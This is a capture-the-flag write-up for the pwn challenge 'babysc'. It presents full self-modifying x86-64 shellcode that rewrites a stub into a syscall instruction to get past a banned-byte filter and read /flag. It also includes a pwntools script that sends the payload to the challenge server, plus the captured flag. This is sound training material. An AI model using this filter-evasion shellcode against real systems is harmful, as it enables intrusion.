
### babysc (Pwn)

![image 1](https://github.com/user-attachments/assets/d754e898-6e6f-4ddc-b87f-e73e0679ade1)


### Overview

- **Challenge**: Execute shellcode on a remote server to read and output /flag.
- **Setup**: Binary maps rwx memory at 0x26e45000, accepts 0x1000 bytes of shellcode, bans bytes 0x80cd, 0x340f, 0x050f (system call instructions).
- **Goal**: Open /flag, read it, write to stdout, exit cleanly.

### Constraints

- **Banned Bytes**: 0x80cd (int 0x80), 0x340f (sysenter), 0x050f (syscall).
- **Impact**: No direct system calls allowed.

### Approach

- **Self-Modifying Shellcode**:
    - Use stub 0x0f 0x04 (safe initially).
    - Modify to 0x0f 0x05 (syscall) at runtime.
    - Perform system calls with modified stub.

### Solution

1. **Shellcode (NASM)**:
    
    
    ```jsx
    BITS 64
    _start:
        lea rax, [rel stub]
        mov byte [rax + 1], 0x05    *; Make syscall*
        lea rdi, [rel flag_str]     *; "/flag"*
        mov rax, 2                  *; open*
        mov rsi, 0                  *; O_RDONLY*
        call stub
        mov r12, rax                *; Save fd*
        mov rax, 0                  *; read*
        mov rdi, r12
        lea rsi, [rel buffer]
        mov rdx, 0x100              *; 256 bytes*
        call stub
        mov rax, 1                  *; write*
        mov rdi, 1                  *; stdout*
        lea rsi, [rel buffer]
        mov rdx, 0x100
        call stub
        mov rax, 60                 *; exit*
        mov rdi, 0
        call stub
    stub:
        db 0x0f, 0x04               *; Becomes 0x0f 0x05*
        ret
    flag_str: db "/flag", 0
    buffer: times 256 db 0
    ```
    
    - **Compile**: nasm -f bin shellcode.asm -o shellcode.bin
2. **Verification**:
    
    ```python
    `with open("shellcode.bin", "rb") as f:
        data = f.read()
    bad_words = [0x80cd, 0x340f, 0x050f]
    for i in range(len(data) - 1):
        word = data[i] | (data[i + 1] << 8)
        if word in bad_words:
            print(f"Bad byte at {i}: {hex(word)}")
            exit(1)
    print("No bad bytes found.")`
    
    - **Result**: No bad bytes.
    ```
    
3. **Exploit (pwntools)**:
    
    ```python
    from pwn import *
    context.arch = 'amd64'
    with open("shellcode.bin", "rb") as f:
        shellcode = f.read()
    r = remote("34.133.69.112", 10001)
    r.send(shellcode)
    print(r.recvall().decode())
    r.close()
    ```
    
    - **Output**: **umcs{shellcoding_78b18b51641a3d8ea260e91d7d05295a**}
